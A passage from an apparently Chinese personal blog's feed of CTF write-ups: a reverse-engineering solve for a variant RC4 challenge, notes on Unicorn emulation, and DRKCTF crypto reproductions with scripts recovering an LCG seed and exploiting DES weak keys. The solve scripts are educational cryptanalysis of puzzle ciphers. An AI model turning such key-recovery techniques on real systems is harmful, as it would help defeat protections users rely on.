class="number">93</span>, <span class="number">94</span>, <span class="number">115</span>, <span class="number">71</span>, <span class="number">95</span>, <span class="number">84</span>, <span class="number">89</span>, <span class="number">56</span>, <span class="number">101</span>, <span class="number">70</span>, <span class="number">2</span>, <span class="number">84</span>, <span class="number">75</span>, <span class="number">127</span>, <span class="number">68</span>, <span class="number">103</span>,</span><br><span class="line">         <span class="number">85</span>, <span class="number">105</span>, <span class="number">113</span>, <span class="number">80</span>, <span class="number">103</span>, <span class="number">95</span>, <span class="number">67</span>, <span class="number">81</span>, <span class="number">7</span>, <span class="number">113</span>, <span class="number">70</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">92</span>, <span class="number">124</span>, <span class="number">93</span>, <span class="number">120</span>, <span class="number">104</span>, <span class="number">108</span>, <span class="number">106</span>, <span class="number">17</span>, <span class="number">80</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">75</span>, <span class="number">93</span>, <span class="number">68</span>, <span class="number">121</span>, <span class="number">26</span>]</span><br><span class="line">lens=<span class="built_in">len</span>(encry)</span><br><span class="line">random.<span class="built_in">seed</span>(<span class="number">0</span>)</span><br><span class="line">rand=[random.<span class="built_in">randint</span>(<span class="number">0</span>,lens) <span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="built_in">len</span>(encry))]</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">for i in range(len(encry)):</span></span><br><span class="line"><span class="string">    flag+=chr(rand[i]^encry[i])</span></span><br><span class="line"><span class="string">print(base64.b64decode(flag))</span></span><br></pre></td></tr></table></figure><h1>愚者杯2023</h1><h2 id="ez-re">ez_re</h2><p>打开一看，是一个变体rc4，这算是我第一次遇见这种</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> key1_; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> key2_; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> len; <span class="comment">// kr00_4</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp-4h] [ebp-414h]</span></span><br><span class="line">  <span class="type">int</span> key2__; <span class="comment">// [esp+10h] [ebp-400h]</span></span><br><span class="line">  <span class="type">int</span> key1; <span class="comment">// [esp+18h] [ebp-3F8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> key2; <span class="comment">// [esp+1Ch] [ebp-3F4h] BYREF</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">1004</span>]; <span class="comment">// [esp+20h] [ebp-3F0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  print(<span class="built_in">std</span>::<span class="built_in">cout</span>, byte_DA31E8);</span><br><span class="line">  <span class="built_in">scanf</span>(input);</span><br><span class="line">  print(<span class="built_in">std</span>::<span class="built_in">cout</span>, byte_DA31F8);</span><br><span class="line">  <span class="built_in">std</span>::istream::operator&gt;&gt;(<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;key1);</span><br><span class="line">  <span class="built_in">std</span>::istream::operator&gt;&gt;(<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;key2);</span><br><span class="line">  key1_ = key1 % <span class="number">299</span>;</span><br><span class="line">  key2_ = key2 % <span class="number">299</span>;</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  key2__ = key2 % <span class="number">299</span>;</span><br><span class="line">  len = <span class="built_in">strlen</span>(input);</span><br><span class="line">  <span class="keyword">if</span> ( len )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v9 = dword_DA3AA0[<span class="number">300</span> * key1_ + key2_] ^ input[i];</span><br><span class="line">      key1_ = (v9 + key1_) % <span class="number">299</span>;</span><br><span class="line">      key2__ = (v9 + key2__) % <span class="number">300</span>;</span><br><span class="line">      v7 = <span class="built_in">std</span>::ostream::operator&lt;&lt;(<span class="built_in">std</span>::<span class="built_in">cout</span>, v9);</span><br><span class="line">      print(v7, <span class="string">&quot;,&quot;</span>);</span><br><span class="line">      key2_ = key2__;</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( i &lt; len );</span><br><span class="line">  &#125;</span><br><span class="line">  print(<span class="built_in">std</span>::<span class="built_in">cout</span>, after);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的dword_DA3AA0是类似S盒的东西，但是有两个key，正常逆是逆不回去的，但是根据异或的性质，如果两个key一样，input和output正好可以相互解密，同时这是一个双射，一一对应，output就是v9的所有值，而key在循环中是加法，所以应当使用从最后到开始反着写，key组合一共只有90000种，而提示有base之后的flag值，由于最后的enc不能base回去，所以猜是先base后encode，flagbase之后是Zmxh，根据这个条件爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> key1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">299</span>):</span><br><span class="line">    <span class="keyword">for</span> key2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">299</span>):</span><br><span class="line">        k1 = key1</span><br><span class="line">        k2 = key2</span><br><span class="line">        mid = enc[<span class="built_in">len</span>(enc)-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">            k1 = (k1-enc[i])%<span class="number">299</span></span><br><span class="line">            k2 = (k2-enc[i])%<span class="number">300</span></span><br><span class="line">            mid = table[<span class="number">300</span>*k1+k2]^enc[i]</span><br><span class="line">            out.append(mid)</span><br><span class="line">        out = out[::-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">bytes</span>(out)[:<span class="number">4</span>]==<span class="string">b&#x27;Zmxh&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(key1)</span><br><span class="line">            <span class="built_in">print</span>(key2)</span><br><span class="line">            <span class="built_in">print</span>(b64decode(<span class="built_in">bytes</span>(out)).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        out = []</span><br></pre></td></tr></table></figure><p>得到key：223和241和</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">flag</span>不在这里呦,</span><br><span class="line">就像生活，</span><br><span class="line">你跨过了人山人海，</span><br><span class="line">你跨过了明月清风，</span><br><span class="line">你见过了三更灯火，</span><br><span class="line">你见过了黎明的城市。</span><br><span class="line"></span><br><span class="line">你觉得你已经足够努力，</span><br><span class="line">你觉得你理应破浪乘风。</span><br><span class="line">你满身疲惫</span><br><span class="line">你筋疲力竭</span><br><span class="line"></span><br><span class="line">可惜，罗马不在前方。</span><br><span class="line">或者，罗马永远在前方，</span><br><span class="line">在别人出生的地方。</span><br><span class="line"></span><br><span class="line">本狸，强烈建议你回到最初的地方</span><br><span class="line">好好研究下加密矩阵</span><br><span class="line">有惊喜哦</span><br></pre></td></tr></table></figure><p>然后看看加密矩阵，不理解，应该是说S盒，但是可以知道这个很长，并且是90000个数，不理解，看wp发现这是一个图片的单通道数据，作为红色</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">single_channel_array = np.array(table, dtype=np.uint8).reshape(<span class="number">300</span>, <span class="number">300</span>)</span><br><span class="line"></span><br><span class="line">rgb_array = np.zeros((<span class="number">300</span>, <span class="number">300</span>, <span class="number">3</span>), dtype=np.uint8)</span><br><span class="line">rgb_array[:,:,<span class="number">0</span>] = single_channel_array</span><br><span class="line">img = Image.fromarray(rgb_array, <span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line">img.save(<span class="string">&#x27;output_image.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>然后flag在图片中</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ctfshow</span>&#123;d244daeb-<span class="number">7182</span>-<span class="number">4</span>c98-bec6-<span class="number">0</span>c99329ab71f&#125;</span><br></pre></td></tr></table></figure><p>这真不是misc，不过下次应该就能想到了</p><hr><p>CISCN好难啊啊啊啊</p><p>裂开</p><p>QAQ</p><p>不管了，还有好多东西没写</p>]]></content>
      
      
      <categories>
          
          <category> 题集 </category>
          
          <category> CTF </category>
          
          <category> 杂题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unicorn-模拟执行</title>
      <link href="/posts/2d7b033c.html"/>
      <url>/posts/2d7b033c.html</url>
      
        <content type="html"><![CDATA[<p>之前打DASCTF遇到了一个平坦化的题目，但是正好D-810和网上的脚本都失效了，所以准备自己研究一下，然后发现很多网上的帖子都指向了Unicorn，所以不得不学一下这个工具。</p><p>路：</p><p>[<a href="https://bbs.kanxue.com/thread-224330.htm#msg_header_h3_2">翻译]Unicorn引擎教程-外文翻译-看雪-安全社区|安全招聘|kanxue.com</a></p><p>[<a href="https://bbs.kanxue.com/thread-252321.htm">原创]ARM64 OLLVM反混淆-Android安全-看雪-安全社区|安全招聘|kanxue.com</a></p><p><a href="https://www.cnblogs.com/Only-xiaoxiao/p/17316343.html">unicorn 入门学习 - Only-xiaoxiao - 博客园 (cnblogs.com)</a></p><p>[<a href="https://bbs.kanxue.com/thread-275296.htm">原创]2022祥云杯CTF babyparser-CTF对抗-看雪-安全社区|安全招聘|kanxue.com</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
          
          <category> 逆向 </category>
          
          <category> 工具 </category>
          
          <category> 模拟执行 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 模拟执行 </tag>
            
            <tag> 平坦化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DRKCTF-复现</title>
      <link href="/posts/5213c585.html"/>
      <url>/posts/5213c585.html</url>
      
        <content type="html"><![CDATA[<p>我们开展的DRKCTF！</p><p>没打，而且好难，所以跟着wp把它复现出来</p><h2 id="CRYPTO">CRYPTO</h2><h3 id="密码-sinin">密码_sinin</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = <span class="string">b&#x27;flag&#123;********&#125;&#x27;</span></span><br><span class="line">a =  getPrime(<span class="number">247</span>)</span><br><span class="line">b =  getPrime(<span class="number">247</span>)</span><br><span class="line">n =  getPrime(<span class="number">247</span>)</span><br><span class="line"></span><br><span class="line">seed = bytes_to_long(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LCG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed, a, b, m</span>):</span><br><span class="line">        self.seed = seed  </span><br><span class="line">        self.a = a  </span><br><span class="line">        self.b = b  </span><br><span class="line">        self.m = m  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate</span>(<span class="params">self</span>):</span><br><span class="line">        self.seed = (self.a * self.seed + self.b) % self.m</span><br><span class="line">        self.seed = (self.a * self.seed + self.b) % self.m</span><br><span class="line">        <span class="keyword">return</span> self.seed</span><br><span class="line"></span><br><span class="line">seed = bytes_to_long(m)</span><br><span class="line"></span><br><span class="line">output = LCG(seed,a,b,n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(getPrime(<span class="number">16</span>)):</span><br><span class="line">    output.generate()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(output.generate())</span><br><span class="line"><span class="built_in">print</span>(output.generate())</span><br><span class="line"><span class="built_in">print</span>(output.generate())</span><br><span class="line"><span class="built_in">print</span>(output.generate())</span><br><span class="line"><span class="built_in">print</span>(output.generate())</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">5944442525761903973219225838876172353829065175803203250803344015146870499</span></span><br><span class="line"><span class="string">141002272698398325287408425994092371191022957387708398440724215884974524650</span></span><br><span class="line"><span class="string">42216026849704835847606250691811468183437263898865832489347515649912153042</span></span><br><span class="line"><span class="string">67696624031762373831757634064133996220332196053248058707361437259689848885</span></span><br><span class="line"><span class="string">19724224939085795542564952999993739673429585489399516522926780014664745253</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>这个是LCG线性同余随机数生成器</p><p>原理是<a href="https://zer0yu.github.io/2018/11/02/Cracking-LCG/">攻击线性同余生成器(LCG) (zer0yu.github.io)</a></p><p>过程：</p><ol><li>求m</li><li>求a</li><li>求b</li><li>求seed</li></ol><p>这里由于是间隔一个来给X，所以求到$a^2$之后不好求a，太大了，所以要以$a^2$作为新的a，$(a+1)b$作为新的b</p><p>求到后就可以穷举2的16次方爆flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gy</span><br><span class="line">x0 = <span class="number">5944442525761903973219225838876172353829065175803203250803344015146870499</span></span><br><span class="line">x1 = <span class="number">141002272698398325287408425994092371191022957387708398440724215884974524650</span></span><br><span class="line">x2 = <span class="number">42216026849704835847606250691811468183437263898865832489347515649912153042</span></span><br><span class="line">x3 = <span class="number">67696624031762373831757634064133996220332196053248058707361437259689848885</span></span><br><span class="line">x4 = <span class="number">19724224939085795542564952999993739673429585489399516522926780014664745253</span></span><br><span class="line"></span><br><span class="line">d0 = x1 - x0</span><br><span class="line">d1 = x2 - x1</span><br><span class="line">d2 = x3 - x2</span><br><span class="line">d3 = x4 - x3</span><br><span class="line"></span><br><span class="line">k1 = d2*d0 - d1*d1</span><br><span class="line">k2 = d3*d0 - d1*d2</span><br><span class="line">m = math.gcd(k1,k2)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">inv_d0 = gy.invert(d0,m)</span><br><span class="line">pa = d1*inv_d0 % m</span><br><span class="line"><span class="built_in">print</span>(pa)</span><br><span class="line"></span><br><span class="line">b = x1 - pa*x0 % m</span><br><span class="line">inv_a = gy.invert(pa,m)</span><br><span class="line">seed = inv_a * (x0-b)%m</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">16</span>):</span><br><span class="line">    seed = inv_a * (seed-b)% m</span><br><span class="line">    flag = long_to_bytes(seed)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"> <span class="comment">#b&#x27;flag&#123;Hello_CTF&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>还有第二种方法</p><p>Grobner基求解多项式多个根，但是不会，给个D神的链接QAQ</p><p><a href="https://dexterjie.github.io/2023/07/05/%E6%B5%81%E5%AF%86%E7%A0%81/%E6%B5%81%E5%AF%86%E7%A0%81-LCG/">LCG | DexterJie’Blog</a></p><h3 id="EzDES">EzDES</h3><p>一开始没想到QAQ</p><p><a href="https://lightless.me/archives/DES-Weak-Keys.html">DES 弱密钥 - lightless blog</a>看看佬的blog</p><blockquote><p>有四个弱密钥是绝对不能使用的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\x01\x01\x01\x01\x01\x01\x01\x01</span><br><span class="line">\xFE\xFE\xFE\xFE\xFE\xFE\xFE\xFE</span><br><span class="line">\xE0\xE0\xE0\xE0\xF1\xF1\xF1\xF1</span><br><span class="line">\x1F\x1F\x1F\x1F\x0E\x0E\x0E\x0E</span><br></pre></td></tr></table></figure><p>如果不考虑校验位的密钥，下面几个也是属于弱密钥的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\x00\x00\x00\x00\x00\x00\x00\x00</span><br><span class="line">\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF</span><br><span class="line">\xE1\xE1\xE1\xE1\xF0\xF0\xF0\xF0</span><br><span class="line">\x1E\x1E\x1E\x1E\x0F\x0F\x0F\x0F</span><br></pre></td></tr></table></figure><p>如果使用弱密钥，PC1 计算的结果会导致轮密钥全部为 0，全部为 1 或全部 01 交替。<br>因为所有的轮密钥都是一样的，并且 DES 是 Feistel 网络的结构，这就导致加密函数是自反相 (self-inverting) 的，结果就是加密一次看起来没什么问题，但是如果再加密一次就得到了明文。</p></blockquote><blockquote><h2 id="部分弱密钥">部分弱密钥</h2><p>部分弱密钥是指只会在计算过程中产生两个不同的子密钥，每一个在加密的过程中使用 8 次。这就意味着这对密钥 K1 和 K2 有如下性质：<br><img src="https://upload.wikimedia.org/math/0/e/c/0ec16658b1f5ae9031cb4993692794dc.png" alt="部分弱密钥性质"></p><p>6 个常见的部分弱密钥对</p><ul><li>0x011F011F010E010E and 0x1F011F010E010E01</li><li>0x01E001E001F101F1 and 0xE001E001F101F101</li><li>0x01FE01FE01FE01FE and 0xFE01FE01FE01FE01</li><li>0x1FE01FE00EF10EF1 and 0xE01FE01FF10EF10E</li><li>0x1FFE1FFE0EFE0EFE and 0xFE1FFE1FFE0EFE0E</li><li>0xE0FEE0FEF1FEF1FE and 0xFEE0FEE0FEF1FEF1</li></ul><p>OpenSSL 中对弱密钥的检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">119</span> <span class="type">static</span> <span class="type">const</span> DES_cblock weak_keys[NUM_WEAK_KEY]=&#123;</span><br><span class="line"><span class="number">120</span>     <span class="comment">/* weak keys */</span></span><br><span class="line"><span class="number">121</span>     &#123;<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x01</span>&#125;,</span><br><span class="line"><span class="number">122</span>     &#123;<span class="number">0xFE</span>,<span class="number">0xFE</span>,<span class="number">0xFE</span>,<span class="number">0xFE</span>,<span class="number">0xFE</span>,<span class="number">0xFE</span>,<span class="number">0xFE</span>,<span class="number">0xFE</span>&#125;,</span><br><span class="line"><span class="number">123</span>     &#123;<span class="number">0x1F</span>,<span class="number">0x1F</span>,<span class="number">0x1F</span>,<span class="number">0x1F</span>,<span class="number">0x0E</span>,<span class="number">0x0E</span>,<span class="number">0x0E</span>,<span class="number">0x0E</span>&#125;,</span><br><span class="line"><span class="number">124</span>     &#123;<span class="number">0xE0</span>,<span class="number">0xE0</span>,<span class="number">0xE0</span>,<span class="number">0xE0</span>,<span class="number">0xF1</span>,<span class="number">0xF1</span>,<span class="number">0xF1</span>,<span class="number">0xF1</span>&#125;,</span><br><span class="line"><span class="number">125</span>     <span class="comment">/* semi-weak keys */</span></span><br><span class="line"><span class="number">126</span>     &#123;<span class="number">0x01</span>,<span class="number">0xFE</span>,<span class="number">0x01</span>,<span class="number">0xFE</span>,<span class="number">0x01</span>,<span class="number">0xFE</span>,<span class="number">0x01</span>,<span class="number">0xFE</span>&#125;,</span><br><span class="line"><span class="number">127</span>     &#123;<span class="number">0xFE</span>,<span class="number">0x01</span>,<span class="number">0xFE</span>,<span class="number">0x01</span>,<span class="number">0xFE</span>,<span class="number">0x01</span>,<span class="number">0xFE</span>,<span class="number">0x01</span>&#125;,</span><br><span class="line"><span class="number">128</span>     &#123;<span class="number">0x1F</span>,<span class="number">0xE0</span>,<span class="number">0x1F</span>,<span class="number">0xE0</span>,<span class="number">0x0E</span>,<span class="number">0xF1</span>,<span class="number">0x0E</span>,<span class="number">0xF1</span>&#125;,</span><br><span class="line"><span class="number">129</span>     &#123;<span class="number">0xE0</span>,<span class="number">0x1F</span>,<span class="number">0xE0</span>,<span class="number">0x1F</span>,<span class="number">0xF1</span>,<span class="number">0x0E</span>,<span class="number">0xF1</span>,<span class="number">0x0E</span>&#125;,</span><br><span class="line"><span class="number">130</span>     &#123;<span class="number">0x01</span>,<span class="number">0xE0</span>,<span class="number">0x01</span>,<span class="number">0xE0</span>,<span class="number">0x01</span>,<span class="number">0xF1</span>,<span class="number">0x01</span>,<span class="number">0xF1</span>&#125;,</span><br><span class="line"><span class="number">131</span>     &#123;<span class="number">0xE0</span>,<span class="number">0x01</span>,<span class="number">0xE0</span>,<span class="number">0x01</span>,<span class="number">0xF1</span>,<span class="number">0x01</span>,<span class="number">0xF1</span>,<span class="number">0x01</span>&#125;,</span><br><span class="line"><span class="number">132</span>     &#123;<span class="number">0x1F</span>,<span class="number">0xFE</span>,<span class="number">0x1F</span>,<span class="number">0xFE</span>,<span class="number">0x0E</span>,<span class="number">0xFE</span>,<span class="number">0x0E</span>,<span class="number">0xFE</span>&#125;,</span><br><span class="line"><span class="number">133</span>     &#123;<span class="number">0xFE</span>,<span class="number">0x1F</span>,<span class="number">0xFE</span>,<span class="number">0x1F</span>,<span class="number">0xFE</span>,<span class="number">0x0E</span>,<span class="number">0xFE</span>,<span class="number">0x0E</span>&#125;,</span><br><span class="line"><span class="number">134</span>     &#123;<span class="number">0x01</span>,<span class="number">0x1F</span>,<span class="number">0x01</span>,<span class="number">0x1F</span>,<span class="number">0x01</span>,<span class="number">0x0E</span>,<span class="number">0x01</span>,<span class="number">0x0E</span>&#125;,</span><br><span class="line"><span class="number">135</span>     &#123;<span class="number">0x1F</span>,<span class="number">0x01</span>,<span class="number">0x1F</span>,<span class="number">0x01</span>,<span class="number">0x0E</span>,<span class="number">0x01</span>,<span class="number">0x0E</span>,<span class="number">0x01</span>&#125;,</span><br><span class="line"><span class="number">136</span>     &#123;<span class="number">0xE0</span>,<span class="number">0xFE</span>,<span class="number">0xE0</span>,<span class="number">0xFE</span>,<span class="number">0xF1</span>,<span class="number">0xFE</span>,<span class="number">0xF1</span>,<span class="number">0xFE</span>&#125;,</span><br><span class="line"><span class="number">137</span>     &#123;<span class="number">0xFE</span>,<span class="number">0xE0</span>,<span class="number">0xFE</span>,<span class="number">0xE0</span>,<span class="number">0xFE</span>,<span class="number">0xF1</span>,<span class="number">0xFE</span>,<span class="number">0xF1</span>&#125;&#125;;</span><br></pre></td></tr></table></figure><h2 id="有弱密钥的加密算法">有弱密钥的加密算法</h2><ul><li>DES</li><li>RC4</li><li>IDEA</li><li>Blowfish</li></ul></blockquote><p>摘抄完QAQ，再根据提示</p><p>二次加密得到明文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;t\xe4f\x19\xc6\xef\xaaL\xc3R&#125;\x08;K\xc9\x88\xa6|\nF\xc3\x12h\xcd\xd3x\xc3(\x91\x08\x841\xca\x8b\xc1\x94\xb5\x9f[\xcd\xc6\x9f\xf9\xf6\xca\xf5\x1a\xda\x16\xcf\x89\x154\xa1\xfe\xc5\x16\xcf\x89\x154\xa1\xfe\xc5&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;0101010101010101&#x27;</span></span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(key)</span><br><span class="line">des = DES.new(key, DES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">enc = des.encrypt(pad(flag,<span class="number">64</span>))</span><br><span class="line"><span class="built_in">print</span>(enc[:enc.find(<span class="string">b&#x27;&#125;&#x27;</span>)+<span class="number">1</span>])</span><br><span class="line"><span class="comment">#b&#x27;DRKCTF&#123;We4k_K3y_1s_V3ry_D4nger0us_In_DES&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="MidRSA">MidRSA</h3><div class="tip warning faa-parent animated-hover"><p class="faa-horizontal">这道题没写完</p></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 